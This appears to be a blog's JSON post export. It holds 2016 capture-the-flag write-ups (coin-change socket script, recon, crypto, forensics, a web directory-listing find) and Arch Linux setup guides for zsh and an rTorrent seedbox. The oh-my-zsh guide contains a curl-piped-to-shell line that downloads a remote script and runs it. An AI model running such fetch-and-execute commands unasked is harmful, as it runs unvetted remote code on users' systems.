......JFIF......00000010: 0001 0000 fffe 003d 666c 6167 7b72 6f73 .......=flag&#123;ros00000020: 6573 5f72 5f62 6c75 655f 7669 6f6c 6574 es_r_blue_violet00000030: 735f 725f 7233 645f 6d61 7962 335f 6861 s_r_r3d_mayb3_ha00000040: 7261 6d62 6165 5f69 735f 6e6f 745f 6b69 rambae_is_not_ki00000050: 6c6c 7d ll&#125; Thanks to Shankar Raman.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"http://rawsec.ml/tags/forensics/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"CSAW CTF - 25 - Coinslot - Misc","slug":"CSAW-2016-25-coinslot-misc","date":"2016-09-17T22:00:00.000Z","updated":"2016-10-12T21:07:54.495Z","comments":true,"path":"en/CSAW-2016-25-coinslot-misc/","link":"","permalink":"http://rawsec.ml/en/CSAW-2016-25-coinslot-misc/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : CSAW CTF Qualification Round 2016 Website : https://ctf.csaw.io/ Type : Online Format : Jeopardy CTF Time : link Description#Hope #Change #Obama2008 nc misc.chal.csaw.io 8000 SolutionThe problem here is to split up a sum of money into its equivalent in bills and coins (minimum). Here we have to script again: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#!/usr/bin/env python2import socketimport refrom time import sleepfrom decimal import *total = 0def recvuntil(s, pattern, tryouts): data = \"\" for i in range(tryouts): # sleep(1) data += s.recv(9999) if pattern in data: return data return datadef calc(bills): global total times = Decimal(str(total)) / Decimal(str(bills)) if times &gt;= 1: total = Decimal(str(total)) - Decimal(str(int(times))) * Decimal(str(bills)) return int(times)def main(): global total url = \"misc.chal.csaw.io\" port = 8000 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((url, port)) while True: task = recvuntil(s, \"$10,000 bills:\", 10) print(task) total = re.findall(\"\\$(.*)\\s+\\$10,000 bills:\", task) if len(total) == 0: print(task) sleep(10) else: # print(total[0]) total = Decimal(str(total[0])) # $10,000 bills: to_send = str(calc(10000)) s.sendall(to_send + \"\\n\") print(to_send) # $5,000 bills: task = recvuntil(s, \"$5,000 bills:\", 10) print(task) to_send = str(calc(5000)) s.sendall(to_send + \"\\n\") print(to_send) # $1,000 bills: task = recvuntil(s, \"$1,000 bills:\", 10) print(task) to_send = str(calc(1000)) s.sendall(to_send + \"\\n\") print(to_send) # $500 bills: task = recvuntil(s, \"$500 bills:\", 10) print(task) to_send = str(calc(500)) s.sendall(to_send + \"\\n\") print(to_send) # $100 bills: task = recvuntil(s, \"$100 bills:\", 10) print(task) to_send = str(calc(100)) s.sendall(to_send + \"\\n\") print(to_send) # $50 bills: task = recvuntil(s, \"$50 bills:\", 10) print(task) to_send = str(calc(50)) s.sendall(to_send + \"\\n\") print(to_send) # $20 bills: task = recvuntil(s, \"$20 bills:\", 10) print(task) to_send = str(calc(20)) s.sendall(to_send + \"\\n\") print(to_send) # $10 bills: task = recvuntil(s, \"$10 bills:\", 10) print(task) to_send = str(calc(10)) s.sendall(to_send + \"\\n\") print(to_send) # $5 bills: task = recvuntil(s, \"$5 bills:\", 10) print(task) to_send = str(calc(5)) s.sendall(to_send + \"\\n\") print(to_send) # $1 bills: task = recvuntil(s, \"$1 bills:\", 10) print(task) to_send = str(calc(1)) s.sendall(to_send + \"\\n\") print(to_send) # half-dollars (50c): task = recvuntil(s, \"half-dollars (50c):\", 10) print(task) to_send = str(calc(0.50)) s.sendall(to_send + \"\\n\") print(to_send) # quarters (25c): task = recvuntil(s, \"quarters (25c):\", 10) print(task) to_send = str(calc(0.25)) s.sendall(to_send + \"\\n\") print(to_send) # dimes (10c): task = recvuntil(s, \"dimes (10c):\", 10) print(task) to_send = str(calc(0.10)) s.sendall(to_send + \"\\n\") print(to_send) # nickels (5c): task = recvuntil(s, \"nickels (5c):\", 10) print(task) to_send = str(calc(0.05)) s.sendall(to_send + \"\\n\") print(to_send) # pennies (1c): task = recvuntil(s, \"pennies (1c):\", 10) print(task) to_send = str(calc(0.01)) s.sendall(to_send + \"\\n\") print(to_send)main() Oh yeah this script is dirty and can be a lot more functional but you know in CTF all is a matter of time… Proof of flag: 123456789101112131415161718192021222324252627282930313233$22479.22$10,000 bills:2$5,000 bills:0$1,000 bills:2$500 bills:0$100 bills:4$50 bills:1$20 bills:1$10 bills:0$5 bills:1$1 bills:4half-dollars (50c):0quarters (25c):0dimes (10c):2nickels (5c):0pennies (1c):2correct!flag&#123;started-from-the-bottom-now-my-whole-team-fucking-here&#125;","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/tags/misc/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"CSAW CTF - 10 - Music to my ears - Reconnaissance","slug":"CSAW-2016-10-Music-to-my-ears-Recon","date":"2016-09-17T22:00:00.000Z","updated":"2016-10-12T21:07:54.495Z","comments":true,"path":"en/CSAW-2016-10-Music-to-my-ears-Recon/","link":"","permalink":"http://rawsec.ml/en/CSAW-2016-10-Music-to-my-ears-Recon/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : CSAW CTF Qualification Round 2016 Website : https://ctf.csaw.io/ Type : Online Format : Jeopardy CTF Time : link DescriptionYo fam have you listened to my mixtape? user:1245880440:playlist:7bUFR2ujh1p3GfArxM0dHE Hint: The recon spans multiple sites. Author: breadchris Hint 2 was an image of a beet. SolutionNote: I didn’t finished the challenge. We have to look for an user and a playlist. Spotify look like to only big website to use a number id as username, so forge the URL like this: https://play.spotify.com/user/1245880440/playlist/7bUFR2ujh1p3GfArxM0dHE. So we got a playlist named Awesome CTF Music Mix Vol. 1. It’s certainly the good one. The user is Chris Topher. Take the 1st letter of each songs: CHECKOUTTHELASTRADIOSTATION. What is the last radio station? A link with WGU-20 ? Last.fm ? I didn’t find. The second hint is an image of a beet so we can directly think about beets.io/. No more clue to go further. My point of view: CTF organizers, PLEASE, stop to put this kind of useless challenges that make us loose our time and that have no link with cyber-security.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"reconnaissance","slug":"reconnaissance","permalink":"http://rawsec.ml/tags/reconnaissance/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ArchLinux - Install Zsh shell and oh-my-zsh","slug":"archlinux-install-zsh","date":"2016-09-13T22:00:00.000Z","updated":"2016-10-12T21:07:54.502Z","comments":true,"path":"en/archlinux-install-zsh/","link":"","permalink":"http://rawsec.ml/en/archlinux-install-zsh/","excerpt":"","text":"Install Zsh Before installing zsh, see what shell is currently being used: 1$ echo $SHELL Install zsh: 1# pacman -S zsh For additional completion definitions, install the zsh-completions package: 1# pacman -S zsh-completions Make zsh has been installed correctly and configure it: 1$ zsh Set zsh as default shell (list shells with $ chsh -l): 1$ chsh -s /bin/zsh Install Oh My Zsh Install dependencies: 1# pacman -S curl git Install oh-my-zsh: 1sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"http://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"http://rawsec.ml/tags/archlinux/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"http://rawsec.ml/categories/linux/archlinux/"}]},{"title":"ArchLinux - Install rTorrent and ruTorrent","slug":"archlinux-install-rtorrent-rutorrent","date":"2016-09-13T22:00:00.000Z","updated":"2016-10-12T21:07:54.498Z","comments":true,"path":"en/archlinux-install-rtorrent-rutorrent/","link":"","permalink":"http://rawsec.ml/en/archlinux-install-rtorrent-rutorrent/","excerpt":"","text":"Warning: Post in constructionInstall rTorrentAs rTorrent package is always up-to-date on Arch repository, it’s not needed to compile it. Install rtorrent: 1# pacman -S rtorrent Install ruTorrent Create the web server root directory if it doesn’t already exist: 1# mkdir -p /srv/http Go to the web server folder and clone the ruTorrent git repository into it: 12$ cd /srv/http# git clone https://github.com/Novik/ruTorrent.git rutorrent Install Nginx Install nginx-mainline: 1# pacman -S nginx-mainline Enable and start nginx: 12# systemctl enable nginx.service# systemctl start nginx.service Install and configure PHP Install php: 1# pacman -S php Install php-fpm: 1# pacman -S php-fpm Open php configuration: 1# vim /etc/php/php.ini Disable php exposure (expose_php): 1expose_php = Off Enable file uploads (file_uploads): 1file_uploads = On Set max size of post data allowed (post_max_size) 1post_max_size = 15M Set the maximum size of an uploaded file (upload_max_filesize): 1upload_max_filesize = 15M Set the timezone (date.timezone). For more security, limit the files that can be accessed by php (open_basedir): 1open_basedir = /srv/http Enable and start php-fpm: 12# systemctl enable php-fpm# systemctl start php-fpm Configure Nginx Change the default conf: 123# mkdir /etc/nginx/auth# mv /etc/nginx/nginx.conf /etc/nginx/nginx.conf.default# vim /etc/nginx/nginx.conf And add this conf: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960user http;worker_processes auto;# PID error: https://bugs.archlinux.org/task/46500# pid /run/nginx.pid;events &#123; worker_connections 1024; multi_accept on; use epoll;&#125;http &#123; charset UTF-8; ## # Basic Settings ## server_names_hash_bucket_size 64; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_disable &quot;msie6&quot;; gzip_vary on; gzip_proxied any; gzip_comp_level 6; gzip_buffers 16 8k; gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/servers-enabled/*;&#125; Create following directories: 12# mkdir /etc/nginx/servers-available# mkdir /etc/nginx/servers-enabled Create the server domain config: 1# vim /etc/nginx/servers-available/seedbox And add the conf: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465server &#123; listen 80; listen [::]:80; # Redirect all HTTP requests to HTTPS with a 301 Moved Permanently response. return 301 https://$host$request_uri;&#125;#------------------------------------------------------------------------# BLOCK SERVEUR HTTPS#server &#123; listen 443 ssl http2; server_name seedbox; root /srv/http/rutorrent; index index.php index.html index.htm;#------------------------------------------------------------------------# SSL# ssl_certificate /etc/nginx/ssl/seedbox.crt; ssl_certificate_key /etc/nginx/ssl/seedbox.key; ssl_protocols TLSv1.2; ssl_ciphers EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES; ssl_ecdh_curve secp384r1; ssl_prefer_server_ciphers on; # ssl optimizations ssl_session_timeout 5m; ssl_session_cache shared:SSL:20m; ssl_session_tickets on;#------------------------------------------------------------------------# SECURITY add_header X-XSS-Protection &quot;1; mode=block&quot;; auth_basic &quot;Restricted Area&quot;; auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth&quot;;#------------------------------------------------------------------------# PHP# location / &#123; index index.php index.html index.htm; try_files $uri $uri/ /index.php?$args; &#125; location ~ \\.php$ &#123; try_files $uri =404; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php-fpm/php-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; location ^~ /conf/ &#123; deny all; &#125; location ^~ /share/ &#123; deny all; &#125;&#125; Enable the server: 1# ln -s /etc/nginx/servers-available/seedbox /etc/nginx/servers-enabled/seedbox Configure SSLWe will both view self-signed certificate and Let’s Encrypt ones. Self-signed Add certificate folder: 1# mkdir /etc/nginx/ssl Generate self-signed certificate: 1234# cd /etc/nginx/ssl# openssl ecparam -genkey -name secp384r1 -out seedbox.key# openssl req -new -key seedbox.key -sha256 -out seedbox.csr# openssl req -x509 -days 3650 -sha256 -key seedbox.key -in seedbox.csr -out seedbox.crt Modify files rights: 12# chmod 644 /etc/nginx/ssl/*.crt# chmod 640 /etc/nginx/ssl/*.key Let’s EncryptTODO Add an user Create an user: 12# useradd --shell /bin/bash --create-home sdbox# passwd sdbox Create needed folder for rtorrent: 1# mkdir -p /home/sdbox/&#123;torrents,watch,.session&#125; Create rtorrent config file: 1# vim /home/sdbox/.rtorrent.rc Paste the config: 1234567891011121314151617181920scgi_port = 127.0.0.1:5001encoding_list = UTF-8port_range = 45000-65000port_random = nocheck_hash = nodirectory = /home/sdbox/torrentssession = /home/sdbox/.sessionencryption = allow_incoming, try_outgoing, enable_retryschedule = watch_directory,1,1,&quot;load_start=/home/sdbox/watch/*.torrent&quot;schedule = untied_directory,5,5,&quot;stop_untied=/home/sdbox/watch/*.torrent&quot;use_udp_trackers = yesdht = offpeer_exchange = nomin_peers = 40max_peers = 100min_peers_seed = 10max_peers_seed = 50max_uploads = 15execute = &#123;sh,-c,/usr/bin/php /srv/http/rutorrent/php/initplugins.php sdbox &amp;&#125;schedule = espace_disque_insuffisant,1,30,close_low_diskspace=500M Give user permissions: 123# chown --recursive sdbox:sdbox /home/sdbox# chown root:root /home/sdbox# chmod 755 /home/sdbox Edit the virtual server conf: 1# vim /etc/nginx/servers-available/seedbox Add the conf: 1234567 location /SDBOX&#123; include scgi_params; scgi_pass 127.0.0.1:5001; auth_basic &quot;Restricted Area&quot;; auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth sdbox&quot;; &#125; In order to do not install apache-tools, manually generate the auth file for sdbox user (it will write over the file and don’t forget to change the password in the command): 1$ echo -n &quot;sdbox:&quot; | sudo tee /etc/nginx/auth/seedbox_auth &amp;&amp; openssl passwd -apr1 password | sudo tee -a /etc/nginx/auth/seedbox_auth Protect the authentification file: 12# chmod 600 /etc/nginx/auth/seedbox_auth# chown http:http /etc/nginx/auth/* Create ruTorrent config file: 12# mkdir /srv/http/rutorrent/conf/users/sdbox# vim /srv/http/rutorrent/conf/users/sdbox/config.php And add the content: 1234567&lt;?php$pathToExternals[&apos;curl&apos;] = &apos;/usr/bin/curl&apos;;$topDirectory = &apos;/home/sdbox&apos;;$scgi_port = 5001;$scgi_host = &apos;127.0.0.1&apos;;$XMLRPCMountPoint = &apos;/SDBOX&apos;; Correct permissions: 12# chown -R http:http /srv/http# systemctl restart nginx.service Create a rTorrent service Create the file /etc/systemd/user/rtorrent.service containing: 123456789101112131415[Unit]Description=rTorrent DaemonAfter=network.target[Service]Type=forkingKillMode=noneUser=sdboxExecStart=/usr/bin/tmux new-session -c /mnt/storage/rtorrent -s rtorrent -n rtorrent -d rtorrentExecStop=/usr/bin/bash -c &quot;/usr/bin/tmux send-keys -t rtorrent C-q &amp;&amp; while pidof rtorrent &gt; /dev/null; do sleep 0.5; done&quot;WorkingDirectory=/home/sdbox/Restart=on-failure[Install]WantedBy=multi-user.target Enable rtorrent at boot time and manually start it: 12$ systemctl --user enable rtorrent$ systemctl --user start rtorrent Source: sdbox, wiki archlinux","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"http://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"http://rawsec.ml/tags/archlinux/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"http://rawsec.ml/categories/linux/archlinux/"}]},{"title":"ASIS CTF Finals 2016 - 3 - CTF 101 - Trivia","slug":"ASIS-3-CTF-101-Trivia","date":"2016-09-10T22:00:00.000Z","updated":"2016-10-12T21:07:54.532Z","comments":true,"path":"en/ASIS-3-CTF-101-Trivia/","link":"","permalink":"http://rawsec.ml/en/ASIS-3-CTF-101-Trivia/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ASIS CTF Finals 2016 Website : http://asis-ctf.ir/ Type : Online Format : Jeopardy CTF Time : link DescriptionWatch your heads! SolutionOne-liners will be happy: 123456┌─[root@parrot]─[~/CTF]└──╼ #curl https://asis-ctf.ir/challenges/ --head | tr -d &apos;\\r&apos; | sed -En &apos;s/^Flag: (.*); base64/\\1/p&apos; | base64 -d % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- 0:00:01 --:--:-- 0ASIS&#123;31a483900b8576426cccdf55402b9dd6&#125;","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"trivia","slug":"trivia","permalink":"http://rawsec.ml/tags/trivia/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"How to remove pages from a PDF in command line on Linux","slug":"remove-pages-from-pdf-command-line","date":"2016-09-07T22:00:00.000Z","updated":"2016-10-12T21:07:54.518Z","comments":true,"path":"en/remove-pages-from-pdf-command-line/","link":"","permalink":"http://rawsec.ml/en/remove-pages-from-pdf-command-line/","excerpt":"","text":"To remove pages from a PDF in command line on Linux, we’ll use PDFtk. Install pdftk with your favorite packet manager (ex: sudo zypper install pdftk) And run one of those commands: To extract only one page: pdftk original.pdf cat 12 output edited.pdf. To keep only a range of pages: pdftk original.pdf cat 3-26 output edited.pdf. To keep several range and some range without knowing page number (ex: end): pdftk original.pdf cat 1-7 9-end output edited.pdf. More examples here.","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"CTF(x) - 50 - crash - Forensics","slug":"CTFx-50-crash-forensics","date":"2016-08-26T22:00:00.000Z","updated":"2016-10-12T21:07:54.522Z","comments":true,"path":"en/CTFx-50-crash-forensics/","link":"","permalink":"http://rawsec.ml/en/CTFx-50-crash-forensics/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : CTF(x) 2016 Website : http://ctfx.io/ Type : Online Format : Jeopardy CTF Time : link Descriptiondefund was about to give this flag away until his computer crashed. file: flag.zip SolutionTL;DR: flag.zip contains .flag.txt.swp and flag.txt Extract the archive: unzip flag.zip Recover/restore the file with the swap file: vim -r flag/flag.txt You get some ASCII art of the flag: ctf(v1m_is_be77er_than_3macs). Extract of VIM man page:1234-r List swap files, with information about using them for recovery.-r &#123;file&#125; Recovery mode. The swap file is used to recover a crashed editing session. The swap file is a file with the same filename as the text file with &quot;.swp&quot; appended. See &quot;:help recovery&quot;.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"http://rawsec.ml/tags/forensics/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"CTF(x) - 50 - λ - Cryptography","slug":"CTFx-50-lambda-cryptography","date":"2016-08-26T22:00:00.000Z","updated":"2016-10-12T21:07:54.505Z","comments":true,"path":"en/CTFx-50-lambda-cryptography/","link":"","permalink":"http://rawsec.ml/en/CTFx-50-lambda-cryptography/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : CTF(x) 2016 Website : http://ctfx.io/ Type : Online Format : Jeopardy CTF Time : link DescriptionI used this program to encrypt a flag. The output was:n1s4_t1An(f1ctdb@mpl_h3)m3lp3y__Eas file: λ.py SolutionTL;DR : that solution is just a trick not a smart de-obfuscation. Here is the code of the λ.py: 1print (lambda j,m:(lambda f,t:t if len(t) &lt;= 1 else j([f(f,x)for x in m(j,m(reversed,(lambda s:zip(*[iter(s)]*(len(s)/2)))(t+\"\\x01\"*(len(t)%2))))]))(lambda f,t:t if len(t) &lt;= 1 else j([f(f,x)for x in m(j,m(reversed,(lambda s: zip(*[iter(s)]*(len(s)/2)))(t+\"\\x01\"*(len(t)%2))))]),raw_input(\"Plaintext:\")))(''.join,map).replace(\"\\x01\",\"\") It’s clear that the code is obfuscated, but even beautified it’s still a mess. So as I don’t want my brain to blow trying to de-obfuscate this, I got around. I realized that, with enought iteration, we gan get back the original string. So I modified the code to “brute-force” the good combination: 1234567891011# Modiied codemixed_flag = \"n1s4_t1An(f1ctdb@mpl_h3)m3lp3y__Eas\"for i in range(100): old_mixed_flag = mixed_flag mixed_flag = (lambda j, m: (lambda f, t: t if len(t) &lt;= 1 else j([f(f, x) for x in m(j, m(reversed, (lambda s: zip( * [iter(s)] * (len(s) / 2)))(t + \"\\x01\" * (len(t) % 2))))]))(lambda f, t: t if len(t) &lt;= 1 else j([f(f, x) for x in m(j, m(reversed, (lambda s: zip( * [iter(s)] * (len(s) / 2)))(t + \"\\x01\" * (len(t) % 2))))]), old_mixed_flag))(''.join, map).replace(\"\\x01\", \"\") print(str(i) + \" \" + mixed_flag) Here the non-filtered output, that’s quite long: 123456789┌─[root@parrot]─[~/CTF/CTFx/2016/50-lambda_λ-cryptography]└──╼ #python lambda_λ.py0 c1t(fm@db4s_n1nAt1_y_p3sEah_3pll3)m1 n_14s1tnA(tfc1bdm@lpl_3m3)p_3_yhasE2 cf1(t@mbd41sn_An1ty_h_3Eas_l3lpp)m3[...]97 n_14s1tnA(tfc1bdm@lph_3m3)_l3_ypasE98 cf1(t@mbd41sn_An1ty_pl3Eas_h3lp_)m399 ns_41t1An(1tcfdb@mpl_h33)mlp3y__sEa Now let’s see what begins with ctf( 123456789101112131415161718┌─[root@parrot]─[~/CTF/CTFx/2016/50-lambda_λ-cryptography]└──╼ #python lambda_λ.py | grep &apos;ctf(&apos;4 ctf(1m@db4_1nsnAt1_y_h3asElp3pl_m3)10 ctf(1@mbd4_1nsAn1ty__p3asEh_3lplm3)16 ctf(1m@db4_1nsnAt1_yl_3asEp_3plhm3)22 ctf(1@mbd4_1nsAn1ty_h_3asE_l3lppm3)28 ctf(1m@db4_1nsnAt1_ypl3asE_h3pl_m3)34 ctf(1@mbd4_1nsAn1ty__h3asElp3lp_m3)40 ctf(1m@db4_1nsnAt1_y_p3asEh_3pllm3)46 ctf(1@mbd4_1nsAn1ty_l_3asEp_3lphm3)52 ctf(1m@db4_1nsnAt1_yh_3asE_l3plpm3)58 ctf(1@mbd4_1nsAn1ty_pl3asE_h3lp_m3)64 ctf(1m@db4_1nsnAt1_y_h3asElp3pl_m3)70 ctf(1@mbd4_1nsAn1ty__p3asEh_3lplm3)76 ctf(1m@db4_1nsnAt1_yl_3asEp_3plhm3)82 ctf(1@mbd4_1nsAn1ty_h_3asE_l3lppm3)88 ctf(1m@db4_1nsnAt1_ypl3asE_h3pl_m3)94 ctf(1@mbd4_1nsAn1ty__h3asElp3lp_m3) That begins to make sense, more filtering: 12345678910┌─[root@parrot]─[~/CTF/CTFx/2016/50-lambda_λ-cryptography]└──╼ #python lambda_λ.py | grep &apos;ctf(1@mbd4_1nsAn1ty_&apos;10 ctf(1@mbd4_1nsAn1ty__p3asEh_3lplm3)22 ctf(1@mbd4_1nsAn1ty_h_3asE_l3lppm3)34 ctf(1@mbd4_1nsAn1ty__h3asElp3lp_m3)46 ctf(1@mbd4_1nsAn1ty_l_3asEp_3lphm3)58 ctf(1@mbd4_1nsAn1ty_pl3asE_h3lp_m3)70 ctf(1@mbd4_1nsAn1ty__p3asEh_3lplm3)82 ctf(1@mbd4_1nsAn1ty_h_3asE_l3lppm3)94 ctf(1@mbd4_1nsAn1ty__h3asElp3lp_m3) Not so hard: 58 ctf(1@mbd4_1nsAn1ty_pl3asE_h3lp_m3).","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"http://rawsec.ml/tags/crypto/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 30 - Move Along - Web","slug":"IceCTF-30-Move-Along-Web","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.478Z","comments":true,"path":"en/IceCTF-30-Move-Along-Web/","link":"","permalink":"http://rawsec.ml/en/IceCTF-30-Move-Along-Web/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionThis site seems awfully suspicious, do you think you can figure out what they’re hiding? Solution Display source code CTRL + U. The page is only including an image http://move-along.vuln.icec.tf/move_along/nothing-to-see-here.jpg. See the move_along/ sub-folder and go in it move_along/ Nginx listing functionnality is not disabled so we can see there is a sub-folder [0f76da769d67e021518f05b552406ff6/][secretfolde] (dirb won’t work). There is a secret image secret.jpg containing the flag IceCTF{tH3_c4t_15_Ou7_oF_THe_b49}.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 55 - Thor's a hacker now - Misc","slug":"IceCTF-55-Thor-s-a-hacker-now-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.535Z","comments":true,"path":"en/IceCTF-55-Thor-s-a-hacker-now-Misc/","link":"","permalink":"http://rawsec.ml/en/IceCTF-55-Thor-s-a-hacker-now-Misc/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionThor has been staring at this for hours and he can’t make any sense out of it, can you help him figure out what it is? thor.txt Solution thor.txt is an xxd dump so just reverse it to get the binary: xxd -r thor.txt &gt; thor.lz. Check what the binary looks like: 12file thor.lzthor.lz: lzip compressed data, version: 1 We’ll need he lzip lib and utility to manage that: apt-get install lzip. Let’s uncompress the archive: lzip -d thor.lz. Now we get an image: 12file thorthor: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=GIMP 2.8.18], progressive, precision 8, 1600x680, frames 3 Just display it: display thor. 